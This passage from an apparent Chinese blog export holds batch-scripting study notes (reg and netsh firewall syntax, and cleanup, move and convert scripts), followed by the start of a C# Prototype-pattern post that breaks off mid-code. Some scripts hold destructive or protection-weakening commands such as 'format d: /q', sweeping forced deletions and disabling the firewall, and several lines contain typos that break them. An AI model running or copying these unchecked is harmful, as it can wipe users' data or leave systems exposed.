会导致默认对本地计算机的操作。KeyName 必须包括一个有效的根键。有效根键包括 HKLM、HKCU、HKCR、HKU 以及 HKCC。如果指定了远程计算机，则有效根键是 HKLM 和 HKU。 </li><li>KeyName2：指定子项目的地的完整路径。要指定远程计算机，请包括计算机名（以 \\ComputerName\ 格式表示），并将其作为 KeyName 的一部分。省略 \\ComputerName\会导致默认对本地计算机的操作。KeyName 必须包括一个有效的根键。有效根键包括 HKLM、HKCU、HKCR、HKU 以及 HKCC。如果指定了远程计算机，则有效根键是 HKLM 和 HKU。 </li><li>/s：复制指定子项下的所有子项和项。 </li><li>/f：不要求确认而直接复制子项。 </li></ul><p><strong>注</strong>：</p><ul><li>在复制时reg不请求确认</li><li>reg copy操作的返回值<ul><li>0：成功</li><li>1：失败</li></ul></li></ul><p><strong>eg</strong>：</p><pre class=" language-bat"><code class="language-bat">:: 要将 MyApp 项下的所有子项和值复制到 SaveMyApp 项，请键入：Reg COPY HKLM\Software\MyCo\MyApp HKLM\Software\MyCo\SaveMyApp /s :: 要将计算机 ZODIAC 上的 MyCo 项下的所有值复制到当前计算机上的 MyCo1 项，请键入：Reg COPY \\ZODIAC\HKLM\Software\MyCo HKLM\Software\MyCo1 </code></pre><h5 id="reg-delete"><a href="#reg-delete" class="headerlink" title="reg delete"></a>reg delete</h5><p>​        从注册表删除子项或项</p><p><strong>语法</strong>：</p><pre class=" language-bat"><code class="language-bat">Reg Delete KeyName [{/v ValueName | /ve | /va}] [/f]</code></pre><ul><li>KeyName：指定要删除的子项或项的完整路径。要指定远程计算机，请包括计算机名（以 \\ComputerName\ 格式表示），并将其作为 KeyName 的一部分。省略 \\ComputerName\ 会导致默认对本地计算机的操作。KeyName 必须包括一个有效的根键。有效根键包括 HKLM、HKCU、HKCR、HKU 以及 HKCC。如果指定了远程计算机，则有效根键是 HKLM 和 HKU。</li><li>/v ValueName：删除子项下的特定项。如果未指定项，则将删除子项下的所有项和子项。</li><li>/ve：指定只可以删除为空值的项。</li><li>/va：删除指定子项下的所有项。使用本参数不能删除指定子项下的子项。</li><li>/f：无需请求确认而删除现有的注册表子项或项。</li></ul><p><strong>注</strong>：</p><ul><li>reg delete的返回值<ul><li>0：成功</li><li>1：失败</li></ul></li></ul><p><strong>eg</strong>：</p><pre class=" language-bat"><code class="language-bat">:: 要删除注册表项 Timeout 以及其所有子项和值，请键入：Reg DELETE HKLM\Software\MyCo\MyApp\Timeout :: 要删除计算机 ZODIAC 上 HKLM\Software\MyCo 下的注册表值 MTU，请键入：Reg DELETE \\ZODIAC\HKLM\Software\MyCo /v MTU</code></pre><h5 id="reg-export"><a href="#reg-export" class="headerlink" title="reg export"></a>reg export</h5><p>​         将本地计算机的指定子项、项和值复制到一个文件中，以便传输到其他服务器。 </p><p><strong>语法</strong>：</p><pre class=" language-bat"><code class="language-bat">Reg export KeyName FileName [/y]</code></pre><ul><li>KeyName：指定子项的完全路径。Export 操作仅可在本地计算机上工作。KeyName 必须包括一个有效的根键。有效根键包括 HKLM、HKCU、HKCR、HKU 以及 HKCC。 </li><li>FileName： 指定在操作期间创建的文件的名称和路径。该文件必须具有 .Reg 扩展名。 </li><li>/y：不要求确认即覆盖任何现有的名称为 FileName 的文件。 </li></ul><p><strong>注</strong>：</p><ul><li>reg export操作的返回值<ul><li>0：成功</li><li>1：失败</li></ul></li></ul><p><strong>eg</strong>：</p><pre class=" language-bat"><code class="language-bat">:: 要将 MyApp 项的所有子项和值的内容导出到文件 AppBkUp.Reg，请键入：Reg Export HKLM\Software\MyCo\MyApp AppBkUp.Reg</code></pre><h5 id="reg-import"><a href="#reg-import" class="headerlink" title="reg import"></a>reg import</h5><p>​        将包含已导出的注册表子项、项和值的文件的内容复制到本地计算机的注册表中。</p><p><strong>语法</strong>：</p><pre class=" language-bat"><code class="language-bat">reg import FileName</code></pre><ul><li>FileName：指定其内容将复制到本地计算机注册表中的文件的名称和路径。此文件必须使用 Reg export 预先创建。 </li></ul><p><strong>注</strong>：</p><ul><li>reg import操作的返回值<ul><li>0：成功</li><li>1：失败</li></ul></li></ul><p><strong>eg</strong>：</p><pre class=" language-bat"><code class="language-bat">:: 要从名为 AppBkUp.Reg 的文件导入注册表项，请键入：Reg Import AppBkUp.Reg</code></pre><h5 id="reg-load"><a href="#reg-load" class="headerlink" title="reg load"></a>reg load</h5><p>​        将保存的子项和项写回到注册表的不同子项中。与用于进行疑难解答或编辑注册表项的临时文件一起使用。 </p><p><strong>语法</strong>：</p><pre class=" language-bat"><code class="language-bat">Reg load KeyName FileName </code></pre><ul><li>KeyName：指定要加载的子项的完整路径。要指定远程计算机，请包括计算机名（以 \\ComputerName\ 格式表示），并将其作为 KeyName 的一部分。省略 \\ComputerName\ 会导致默认对本地计算机的操作。KeyName 必须包括一个有效的根键。有效根键包括 HKLM、HKCU、HKCR、HKU 以及 HKCC。如果指定了远程计算机，则有效根键是 HKLM 和 HKU。 </li><li>FileName：指定要加载的文件的名称和路径。必须使用 .hiv 作为扩展名的 Reg Save 操作预先创建该文件。 </li></ul><p><strong>注</strong>：</p><ul><li>reg load操作的返回值<ul><li>0：成功</li><li>1：失败</li></ul></li></ul><p><strong>eg</strong>：</p><pre class=" language-bat"><code class="language-bat">::要将名为 TempHive.hiv 的文件加载到 HKLM\TempHive 项，请键入：Reg LOAD HKLM\TempHive TempHive.hiv</code></pre><h5 id="reg-query"><a href="#reg-query" class="headerlink" title="reg query"></a>reg query</h5><p>​        返回位于注册表中指定的子项下的下一层子项和项的列表。</p><p><strong>语法</strong>：</p><pre class=" language-bat"><code class="language-bat">Reg query KeyName [{/v ValueName | /ve}] [/s] [/se Separator] [/f Data] [{/k | /d}] [/c] [/e] [/t Type] [/z]</code></pre><ul><li>KeyName：指定子项的完全路径。要指定远程计算机，请包括计算机名（以 \\ComputerName\ 格式表示），并将其作为 KeyName 的一部分。省略 \\ComputerName\会导致默认对本地计算机的操作。KeyName 必须包括一个有效的根键。有效根键包括 HKLM、HKCU、HKCR、HKU 以及 HKCC。如果指定了远程计算机，则有效根键是 HKLM 和 HKU。</li><li>/v ValueName：指定要查询的注册表值名称。如果省略，则返回 KeyName 的所有值名称。如果还使用了 /f 选项，则此参数的 ValueName 是可选的。 </li><li>/ve：查询空白的值名称。</li><li>/s：指定该参数递归查询所有子项和值名称。</li><li>/se Separator：指定单值分隔符，以搜索 Reg_MULTI_SZ 类型的值名称。如果没有指定 Separator，则使用“\0”。</li><li>/f Data：指定要搜索的数据或模式。如果字符串包含空格，则使用双引号。如果未指定，则使用通配符 (“*”) 作为搜索模式。</li><li>/k：指定只在项名称中搜索。</li><li>/d：指定只在数据中搜索。</li><li>/c：指定查询是区分大小写的。默认情况下，查询是不区分大小写的。</li><li>/e：指定只返回完全匹配项。默认情况下，返回所有匹配项。</li><li>/t Type：指定要搜索的注册表类型。有效的类型包括：Reg_SZ、Reg_MULTI_SZ、Reg_EXPAND_SZ、Reg_DWORD、Reg_BINARY、Reg_NONE。如果未指定，则搜索所有类型。</li><li>/z：指定在搜索结果中包括注册表类型的数字同等物。</li></ul><p><strong>注</strong>：</p><ul><li>reg query操作的返回值<ul><li>0：成功</li><li>1：失败</li></ul></li></ul><p><strong>eg</strong>：</p><pre class=" language-bat"><code class="language-bat">:: 要显示 HKLM\Software\Microsoft\ResKit 项中的名称值 Version 的值，请键入：Reg QUERY HKLM\Software\Microsoft\ResKit /v Version:: 要显示远程计算机 ABC 上的 HKLM\Software\Microsoft\ResKit\Nt\Setup 项下的所有子项和值，请键入：Reg QUERY \\ABC\HKLM\Software\Microsoft\ResKit\Nt\Setup /s:: 要使用“#”作为分隔符显示 Reg_MULTI_SZ 类型的所有子项和值，请键入：Reg QUERY HKLM\Software\Microsoft\ResKit\Nt\Setup /se #:: 要显示数据类型 Reg_SZ 的 HKLM 根下的“SYSTEM”的完全匹配并且区分大小写的匹配项的项、值和数据，请键入：Reg QUERY HKLM /f SYSTEM /t Reg_SZ /c /e:: 要显示数据类型 Reg_BINARY 的根键 HKCU 下的数据中的“0F”的匹配项的项、值和数据，请键入：Reg QUERY HKCU /f 0F /d /t Reg_BINARY:: 要显示 HKLM\SOFTWARE 下的值名称 null（默认值）的值和数据，请键入：Reg QUERY HKLM\SOFTWARE /ve</code></pre><h5 id="reg-restore"><a href="#reg-restore" class="headerlink" title="reg restore"></a>reg restore</h5><p>​        将保存的子项和项写回到注册表。 </p><p><strong>语法</strong>：</p><pre class=" language-bat"><code class="language-bat">Reg restore KeyName FileName</code></pre><ul><li>KeyName：指定要还原的子项的完整路径。Restore 操作仅在本地计算机上工作。KeyName 必须包括一个有效的根键。有效根键包括 HKLM、HKCU、HKCR、HKU 以及 HKCC。</li><li>FileName： 指定其内容将写回到注册表中的文件的名称和路径。必须使用 .hiv 作为扩展名的 Reg save 操作预先创建该文件。</li></ul><p><strong>注</strong>：</p><ul><li>编辑任何注册表项之前，请使用 Reg Save 操作保存父子项。如果编辑失败，则可以使用 Reg Restore 操作还原原来的子项。 </li><li>reg restore操作的返回值<ul><li>0：成功</li><li>1：失败</li></ul></li></ul><p><strong>eg</strong>：</p><pre class=" language-bat"><code class="language-bat">:: 要将名为 NTRKBkUp.hiv 的文件还原到 HKLM\Software\Microsoft\ResKit 项，并覆盖该项的现有内容，请键入：Reg RESTORE HKLM\Software\Microsoft\ResKit NTRKBkUp.hiv</code></pre><h5 id="reg-save"><a href="#reg-save" class="headerlink" title="reg save"></a>reg save</h5><p>​        将指定的子项、项和注册表值的副本保存到指定文件中。</p><p><strong>语法</strong>：</p><pre class=" language-bat"><code class="language-bat">Reg save KeyName FileName [/y]</code></pre><ul><li>KeyName： 指定子项的完全路径。要指定远程计算机，请包括计算机名（以 \\ComputerName\ 格式表示），并将其作为 KeyName 的一部分。省略\\ComputerName\会导致默认对本地计算机的操作。KeyName 必须包括一个有效的根键。有效根键包括 HKLM、HKCU、HKCR、HKU 以及 HKCC。如果指定了远程计算机，则有效根键是 HKLM 和 HKU。</li><li>FileName：指定所创建的文件的名称和路径。如果未指定路径，则使用当前路径。</li><li>/y：不要求确认即覆盖任何现有的名称为 FileName 的文件。</li></ul><p><strong>注</strong>：</p><ul><li>reg save操作的返回值<ul><li>0：成功</li><li>1：失败</li></ul></li><li>编辑任何注册表项之前，请使用 Reg Save 操作保存父子项。如果编辑失败，则可以使用 Reg Restore 操作还原原来的子项。</li></ul><p><strong>eg</strong>：</p><pre class=" language-bat"><code class="language-bat">:: 要将配置单元 MyApp 作为名为 AppBkUp.hiv 的文件保存到当前文件夹中，请键入：Reg SAVE HKLM\Software\MyCo\MyApp AppBkUp.hiv</code></pre><h5 id="reg-unload"><a href="#reg-unload" class="headerlink" title="reg unload"></a>reg unload</h5><p>​        使用 Reg Load 操作删除已加载的部分注册表。</p><p><strong>语法</strong>：</p><pre class=" language-bat"><code class="language-bat">Reg Unload KeyName</code></pre><ul><li>KeyName：指定要卸载的子项的完整路径。要指定远程计算机，请包括计算机名（以 \\ComputerName\格式表示），并将其作为 KeyName 的一部分。省略 \\ComputerName\ 会导致默认对本地计算机的操作。KeyName 必须包括一个有效的根键。有效根键包括 HKLM、HKCU、HKCR、HKU 以及 HKCC。如果指定了远程计算机，则有效根键是 HKLM 和 HKU。</li></ul><p><strong>注</strong>：</p><ul><li>reg unload操作的返回值<ul><li>0：成功</li><li>1：失败</li></ul></li></ul><p><strong>eg</strong>：</p><pre class=" language-bat"><code class="language-bat">:: 要卸载 HKLM 中的配置单元 TempHive，请键入：Reg UNLOAD HKLM\TempHive</code></pre><h3 id="防火墙配置"><a href="#防火墙配置" class="headerlink" title="防火墙配置"></a>防火墙配置</h3><p>​        Netsh(Network Shell)是Windows系统提供的功能强大的网络配置命令行工具。</p><h4 id="add"><a href="#add" class="headerlink" title="add"></a>add</h4><p>​        添加防火墙配置</p><p><strong>eg</strong>：</p><pre class=" language-bat"><code class="language-bat">:: 添加通过防火墙的程序：add allowedprogram program="C:\Program Files (x86)\Common Files\Tencent\QQProtect\Bin\QQProtect.exe" name="TIM" mode=enable:: 添加通过防火墙的C:\Program Files (x86)\Common Files\Tencent\QQProtect\Bin\QQProtect.exe程序，并将防火墙中对应程序的名称改为”TIM":: 添加禁止通过防火墙的程序：add allowedprogram program="C:\Program Files (x86)\Common Files\Tencent\QQProtect\Bin\QQProtect.exe" name="TIM" mode=disable:: 添加禁止通过防火墙的C:\Program Files (x86)\Common Files\Tencent\QQProtect\Bin\QQProtect.exe程序，并将防火墙中对应程序的名称改为”TIM":: 禁止程序访问外部网络add allowedprogram program="C:\Program Files (x86)\Common Files\Tencent\QQProtect\Bin\QQProtect.exe" name="TIM" mode=enable scope=subnet:: 添加通过防火墙的C:\Program Files (x86)\Common Files\Tencent\QQProtect\Bin\QQProtect.exe程序，并将防火墙中对应程序的名称改为”TIM",但该程序只能访问本地网络，禁止访问外部网络:: 定制程序网络访问范围add allowedprogram program="C:\Program Files (x86)\Common Files\Tencent\QQProtect\Bin\QQProtect.exe" name="TIM" mode=enable scope=custom address=192.168.1.12,192.168.1.13:: 添加通过防火墙的C:\Program Files (x86)\Common Files\Tencent\QQProtect\Bin\QQProtect.exe程序，并将防火墙中对应程序的名称改为”TIM",但程序只能访问IP为”192.168.1.12“和”192.168.1.13“的网络:: 添加允许使用TCP协议的端口add portopening protocol=tcp port=8888 name=重要服务 mode=enable:: 添加远程程序访问本地计算机（建立TCP连接）时的端口（端口为”8888“，端口名称为”重要服务“):: 添加UDP协议使用的端口add portopening protocol=udp port=8888 name=重要服务 mode=enable:: 添加远程程序访问本地计算机（建立UDP连接）时的端口（端口为”8888“，端口名称为”重要服务“):: 添加所有协议都可以使用的端口add portopening protocol=all port=8888 name=重要服务 mode=enable:: 允许防火墙的所有协议可通过的端口（端口为”8888“，端口名称为”重要服务“):: 限制外部连接使用端口add portopening protocol=tcp port=8888 name=重要服务 mode=enable SCOP=Subnet:: 限制外部网络通过TCP连接方式与本地计算机的”8888“端口进行通信的计算机:: 定制访问端口的连接add portopening protocol=tcp port=8888 name=重要服务 mode=enable scop=custom address=192.168.1.12,192.168.2.0:: 定制访问端口的连接方式为TCP连接，并且设定IP为“192.168.1.12”的计算机和网路号为“192.168.2”的网络可以通过端口"8888"以TCP连接方式访问本地计算机:: 为指定的网络连接添加可用端口add portopening protocol=tcp port=8888 name=重要服务 mode=enable interface=本地连接:: 为名为“本地连接”的网络连接添加一个以TCP方式连接的端口(8888)，并且将该端口的名称命名为“重要服务”</code></pre><h4 id="delete"><a href="#delete" class="headerlink" title="delete"></a>delete</h4><p>​        删除防火墙配置</p><p><strong>eg</strong>：</p><pre class=" language-bat"><code class="language-bat">delete allowedprogram program="C:\Program Files (x86)\Common Files\Tencent\QQProtect\Bin\QQProtect.exe":: 删除防火墙允许的程序delete portopening protocol=tcp port=8888 interface=本地连接:: 删除通过网络连接名为“本地连接”的TCP连接端口“8888"</code></pre><h4 id="set-1"><a href="#set-1" class="headerlink" title="set"></a>set</h4><p>​        设置防火墙配置</p><p><strong>eg</strong>：</p><pre class=" language-bat"><code class="language-bat">:: 编辑已添加的程序设置set allowedprogram program="C:\Program Files (x86)\Common Files\Tencent\QQProtect\Bin\QQProtect.exe" scop=custom address=192.168.1.12:: 将QQProtect程序设置为只能访问IP为”192.168.1.12“的计算机:: 编辑防火墙中已添加的端口set portopening protocol=tcp port=8888 name=重要服务 mode=enable:: 将TCP连接端口"8888"的名称设置为“重要服务”，类型为“可用”set icmpsetting type=8 mode=enable:： 启用ICMP报文回显请求set icmpsetting type=8 mode=disable:: 关闭ICMP报文回显请求set icmpsetting type=8 mode=disable interface:: 设置指定网络接口ICMP报文功能:: 指定防火墙日志文件set logging filelocation=D:\fhq.log maxfile=400:: 将防火墙的日志文件fhq.log建立在D盘，并且日志文件的最大容量为400KBset logging droppedpcket=enable:: 让防火墙记录被丢弃的数据包set logging droppedpcket=disable:: 让防火墙不记录被丢弃的数据包set logging connections=enable:: 让防火墙记录成功连接set logging connections=disable:: 让防火墙记录不成功连接set notifications mode=disable:: 禁止防火墙弹出通知对话框set notifications mode=enable:: 允许防火墙弹出通知对话框set opmode mode=enable:: 开启Windows防火墙功能set opmode mode=disable:: 关闭Windows防火墙功能set opmode mode=enable interface=本地连接:: 为指定网络接口开启防火墙set opmode mode=enable exceptions=enable:: 开启防火墙例外功能set service type=fileandprint mode=enable:: 允许文件和打印机共享服务通过防火墙set service type=remotedesktop mode=enable:: 允许远程管理服务通过防火墙set service type=remoteadmin mode=enable:: 允许远程协助和远程桌面服务通过防火墙set service type=upnp mode=enable:: 允许UPnP框架服务通过防火墙set service type=all mode=enable:: 允许所有服务类型通过防火墙set service type=fileandprint mode=enable scope=subnet:: 显示外部网络使用指定类型的服务set service type=fileanprint mode enable scope=custom address=192.168.1.12:: 限制访问指定类型服务的连接reset:: 恢复防火墙默认设置</code></pre><h4 id="show"><a href="#show" class="headerlink" title="show"></a>show</h4><p>​        显示防火墙配置</p><p><strong>eg</strong>：</p><pre class=" language-bat"><code class="language-bat">show allowedprogram verbose=enable:: 查看允许通过防火墙的程序show config verbose=enable:: 查看防火墙的详细配置信息show icmpsetting verbose=enable:: 查看ICMP报文设置信息show logging :: 显示防火墙配置文件设置信息show opmode:: 查看当前防火墙的工作状态show portopening cerbose=enable:: 查看防火墙端口设置信息show service verbose=enable:: 查看防火墙服务设置信息show state verbose=enable:: 查看当前防火墙工作状态信息</code></pre><h1 id="批处理应用"><a href="#批处理应用" class="headerlink" title="批处理应用"></a>批处理应用</h1><h2 id="程序的启动与关闭"><a href="#程序的启动与关闭" class="headerlink" title="程序的启动与关闭"></a>程序的启动与关闭</h2><p>​        start命令行可以用来启动程序，同时也可以使用start命令通过任务管理器来关闭程序。</p><p><strong>步骤</strong>：</p><ol><li>确定文件位置</li><li>建立批处理文件</li></ol><p><strong>eg</strong>：</p><pre class=" language-bat"><code class="language-bat">rem -------start--------rem TIMstart.batrem --------end---------@echo offstart "" "C:\Program Files (x86)\Tencent\TIM\Bin\TIM.exe"::等价于：::cd "C:\Program Files (x86)\Tencent\TIM\Bin\"::start TIM.exerem 如果不加中间的""，那么会进入cmd模式。。rem -------start--------rem TIMstop.batrem --------end---------@echo offstart taskkill /f /im TIM.exestart taskkill /f /im TXPlatform.exestart taskkill /f /im QQProtect.exe::实际上是通过“任务管理器”终止的进程来实现的</code></pre><h2 id="删除临时文件夹中的文件"><a href="#删除临时文件夹中的文件" class="headerlink" title="删除临时文件夹中的文件"></a>删除临时文件夹中的文件</h2><p>​        使用del命令快速删除指定文件夹中的文件。</p><p><strong>eg</strong>：</p><pre class=" language-bat"><code class="language-bat">@echo offtitle 删除临时文件夹中文件color B0echo -----------------------------------------echo 开始进行文件删除操作...pausecd \c:cd \cd windows\tempdel *.* /ppause</code></pre><h2 id="自动清除系统垃圾文件"><a href="#自动清除系统垃圾文件" class="headerlink" title="自动清除系统垃圾文件"></a>自动清除系统垃圾文件</h2><p>​        Windows操作系统在安装和使用过程中会产生很多垃圾，包括临时文件(<code>*.tmp</code>、<code>*._mp</code>)、日志文件(<code>*.log</code>)、临时帮助文件(<code>*.gid</code>)、磁盘检查文件(<code>*.chk</code>)、临时备份文件(<code>*.old、*.bak</code>)以及其他临时文件。</p><p><strong>eg</strong>：</p><pre class=" language-bat"><code class="language-bat">@echo offtitle 自动清除系统垃文件color B0echo -----------------------------------------echo 开始清除文件...pausecls@echo off:: 依次清除系统根目录中的临时文件、临时帮助文件、磁盘检查文件、临时备份文件del /f /s /q %systemdrive%\*.tmpdel /f /s /q %systemdrive%\*._mpdel /f /s /q %systemdrive%\*.giddel /f /s /q %systemdrive%\*.chkdel /f /s /q %systemdrive%\*.old:: 依次清除Windows目录中的临时备份文件、预读文件、临时文件del /f /s /q %windir%\*.bakdel /f /s /q %windir%\prefetch\*.*rd /s /q %windir%\temp & mk %windir%\temp:: 依次清除用户目录下的临时文件del /f /s /q "%userprofile%\Local Settings\Temporary Internet Files\*.*"del /f /s /q "%userprofile%\Local Setting\Temp\*.*"rd /s /q "%userprofile%\Local Setting\Temp\" & md "%userprofile%\Local Setting\Temp\":: 依次清除用户安装目录下的cookie文件、临时文件del /f /s /q "%appdata%\Microsoft\Windows\cookies\*.*"del /f /s /q "%appdata%\Microsoft\Windows\Recent\*.*"@echo offclscolor 2Eecho ---------------------系统垃清理完成！！！-----------------------echo ----------------------------------------------------------------echo ----------------------------退出--------------------------------pause</code></pre><h2 id="批量转移同一类型的文件"><a href="#批量转移同一类型的文件" class="headerlink" title="批量转移同一类型的文件"></a>批量转移同一类型的文件</h2><p>​        转移指定目录下同一类型的文件到一个指定的目录下(存在)。</p><p><strong>eg</strong>：</p><pre class=" language-bat"><code class="language-bat">@echo offtitle 批量转移同一类型的文件color B0echo -----------------------------------------echo 开始转移文件...pauseclsmove c:\download\*.jpg d:\images:: 目的路径必须存在pause</code></pre><h2 id="用批处理批量移动、删除文件"><a href="#用批处理批量移动、删除文件" class="headerlink" title="用批处理批量移动、删除文件"></a>用批处理批量移动、删除文件</h2><p>​        使用批处理可以很方便地进行文件的批量移动或删除，出错时也很容易修改</p><p><strong>eg</strong>：</p><ul><li>将D盘.htm文件移动到E盘，再格式化D盘，然后将文件移回D盘，并将后缀改为.html。</li></ul><pre class=" language-bat"><code class="language-bat">rem --------------------------rem 1.batrem --------------------------@echo offe:md dd:copy *.htm e:\d@if exist e:\d\*.htm call 2.batrm e:\d</code></pre><pre class=" language-bat"><code class="language-bat">rem ---------------------------rem 2.batrem ---------------------------@echo offformat d: /qcopy e:\d\*.htm d:d:ren *.htm *.html</code></pre><h2 id="删除大小和类型一样的重复文件-没见效果"><a href="#删除大小和类型一样的重复文件-没见效果" class="headerlink" title="删除大小和类型一样的重复文件(没见效果)"></a>删除大小和类型一样的重复文件(没见效果)</h2><p>​        大小和类型一样的文件基本上都是重复文件，可以使用批处理文件将其删除。</p><h2 id="删除某盘内的所有空目录"><a href="#删除某盘内的所有空目录" class="headerlink" title="删除某盘内的所有空目录"></a>删除某盘内的所有空目录</h2><p><strong>eg</strong>：</p><ul><li>删除H盘中所有的空目录</li></ul><pre class=" language-bat"><code class="language-bat">@echo offtitle 删除某盘内的所有空目录color B0echo -----------------------------------------echo 开始删除所有空目录...pausedir h:\ /ad /b /s | sort /r > h:\kill.txtfor /f "delims=;" %%i in (h:\kill.txt) do rd "%%i"echo y | del h:\kill.txt:: 如需对其他磁盘进行操作，请将h磁盘替换为其他盘符clscolor 2Eecho --------------------删除某盘所有空目录操作结束-----------------echo ---------------------------------------------------------------echo ----------------------------关闭-------------------------------pause</code></pre><h2 id="转换磁盘为NTFS格式"><a href="#转换磁盘为NTFS格式" class="headerlink" title="转换磁盘为NTFS格式"></a>转换磁盘为NTFS格式</h2><p><strong>eg</strong>：</p><pre class=" language-bat"><code class="language-bat">@echo offtitle 转换磁盘为NTFS格式color B0echo -----------------------------------------echo 开始磁盘格式转换...pause@echo off@echo.convert h:/fs:ntfs:: 对其他磁盘进行格式化的时候，可将H磁盘修改为对应盘符:: 优点：->不会删除原来存在的文件clscolor 2Eecho --------------------磁盘格式转换结束-----------------echo -----------------------------------------------------echo --------------------------关闭-----------------------pause</code></pre><ul><li>NTFS格式的分区在DOS/Windows 9X下均不支持，Windows 2000之后的系统才支持</li><li>使用该方式转换不会删除磁盘中原来存在的文件</li></ul><h2 id="显示或隐藏文件扩展名"><a href="#显示或隐藏文件扩展名" class="headerlink" title="显示或隐藏文件扩展名"></a>显示或隐藏文件扩展名</h2><p><strong>eg</strong>：</p><ul><li>使用批处理程序通过修改注册表来实现扩展名的显示与隐藏</li></ul><pre class=" language-bat"><code class="language-bat">@echo offtitle 显示或隐藏文件扩展名color B0echo -----------------------------------------echo 开始执行操作...pausereg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced" /v HideFileExt /t reg_dword /d 00000000 /f:: 键值为1隐藏；键值为0显示clscolor 2Eecho --------------------操作结束-----------------echo ---------------------------------------------echo ----------------------关闭-------------------pause</code></pre><h1 id="附录"><a href="#附录" class="headerlink" title="附录"></a>附录</h1><p>参考链接：</p><p><a href="https://www.cnblogs.com/DswCnblog/category/820715.html" target="_blank" rel="noopener">dsw846</a></p><p><a href="https://www.cnblogs.com/ECJTUACM-873284962/category/1081980.html" target="_blank" rel="noopener">Angel_Kitty</a></p><p>相关材料：</p><p><a href="../BatchFiles">批处理库</a></p><p><a href="../XMind/批处理思维导图.xmind">批处理思维导图</a></p><hr>]]></content>
      
      
      <categories>
          
          <category> 批处理 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 批处理 </tag>
            
            <tag> 学习笔记 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>原型模式</title>
      <link href="/2020/08/22/yuan-xing-mo-shi/"/>
      <url>/2020/08/22/yuan-xing-mo-shi/</url>
      
        <content type="html"><![CDATA[<h1 id="定义理解"><a href="#定义理解" class="headerlink" title="定义理解"></a>定义理解</h1><p>​        原型模式(Prototype)是一种创建型设计模式，用原型实例指定创建对象的种类，并且通过拷贝这些原型创建新的对象。</p><p>​        <font color="blue">原型模式其实就是从一个对象再创建一个可定制的对象，而且不需知道任何创建的细节。</font></p><h1 id="角色与职责"><a href="#角色与职责" class="headerlink" title="角色与职责"></a>角色与职责</h1><ul><li><strong>客户端(Client)</strong>：通过调用原型类的克隆操作创建一个新对象。</li><li><strong>原型类(Prototype)</strong>：声明一个接口用于克隆自己。</li><li><strong>具体原型类(ConcretePrototype)</strong>：实现克隆自己的操作。</li></ul><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/GOFDesignPattern/原型模式/原型模式经典结构.png" alt="原型模式经典结构"></center><h1 id="实现步骤"><a href="#实现步骤" class="headerlink" title="实现步骤"></a>实现步骤</h1><ol><li>创建一个原型类，并定义一个克隆自己的接口(或抽象方法)</li><li>实现一个具体原型类，在类体中实现原型类中克隆自己的操作</li><li>在客户端调用具体原型类的Clone()方法完成对象的克隆操作</li></ol><h1 id="代码示例"><a href="#代码示例" class="headerlink" title="代码示例"></a>代码示例</h1><p>Prototype抽象原型类：</p><pre class=" language-csharp"><code class="language-csharp"><span class="token comment" spellcheck="true">/// &lt;summary></span><span class="token comment" spellcheck="true">/// 抽象原型类</span><span class="token comment" spellcheck="true">/// &lt;/summary></span><span class="token keyword">abstract</span> <span class="token keyword">class</span> <span class="token class-name">Prototype</span><span class="token punctuation">{</span>    <span class="token keyword">private</span> <span class="token keyword">string</span> id<span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">// Constructor </span>    <span class="token keyword">public</span> <span class="token function">Prototype</span><span class="token punctuation">(</span><span class="token keyword">string</span> id<span class="token punctuation">)</span>    <span class="token punctuation">{</span>         <span class="token keyword">this</span><span class="token punctuation">.</span>id <span class="token operator">=</span> id<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token comment" spellcheck="true">// Property </span>    <span class="token keyword">public</span> <span class="token keyword">string</span> Id    <span class="token punctuation">{</span>         <span class="token keyword">get</span> <span class="token punctuation">{</span> <span class="token keyword">return</span> id<span class="token punctuation">;</span> <span class="token punctuation">}</span>    <span class="token punctuation">}</span>     <span class="token comment" spellcheck="true">/// &lt;summary></span>     <span class="token comment" spellcheck="true">/// 提供的克隆接口</span>     <span class="token comment" spellcheck="true">/// &lt;/summary></span>     <span class="token comment" spellcheck="true">/// &lt;returns>返回值类型是原型类类型&lt;/returns></span>     <span class="token keyword">public</span> <span class="token keyword">abstract</span> Prototype <span class="token function">Clone</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span></code></pre><p>ConcretePrototype1具体原型类：</p><pre class=" language-csharp"><code class="language-csharp"><span class="token comment" spellcheck="true">/// &lt;summary></span><span class="token comment" spellcheck="true">/// 具体原型类</span><span class="token comment" spellcheck="true">/// &lt;/summary></span><span class="token keyword">class</span> <span class="token class-name">ConcretePrototype1</span> <span class="token punctuation">:</span> Prototype<span class="token punctuation">{</span>    <span class="token comment" spellcheck="true">// Constructor </span>    <span class="token keyword">public</span> <span class="token function">ConcretePrototype1</span><span class="token punctuation">(</span><span class="token keyword">string</span> id<span class="token punctuation">)</span>         <span class="token punctuation">:</span> <span class="token keyword">base</span><span class="token punctuation">(</span>id<span class="token punctuation">)</span>    <span class="token punctuation">{</span>    <span class="token punctuation">}</span>     <span class="token comment" spellcheck="true">/// &lt;summary></span>     <span class="token comment" spellcheck="true">/// 实现原型类中的继承而来的虚方法</span>     <span class="token comment" spellcheck="true">/// &lt;/summary></span>     <span class="token comment" spellcheck="true">/// &lt;returns>&lt;/returns></span>     <span class="token keyword">public</span> <span class="token keyword">override</span> Prototype <span class="token function">Clone</span><span class="token punctuation">(</span><span class="token punctuation">)</span>     <span class="token punctuation">{</span>         <span class="token comment" spellcheck="true">// Shallow copy </span>         <span class="token keyword">return</span> <span class="token punctuation">(</span>Prototype<span class="token punctuation">)</span><span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">MemberwiseClone</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><p>ConcretePrototype2具体原型类：</p><pre class=" language-csharp"><code class="language-csharp"><span class="token comment" spellcheck="true">/// &lt;summary></span><span class="token comment" spellcheck="true">/// 具体原型类</span><span class="token comment" spellcheck="true">/// &lt;/summary></span><span class="token keyword">class</span> <span class="token class-name">ConcretePrototype2</span> <span class="token punctuation">:</span> Prototype<span class="token punctuation">{</span>    <span class="token comment" spellcheck="true">// Constructor </span>    <span class="token keyword">public</span> <span class="token function">ConcretePrototype2</span><span class="token punctuation">(</span><span class="token keyword">string</span> id<span class="token punctuation">)</span>         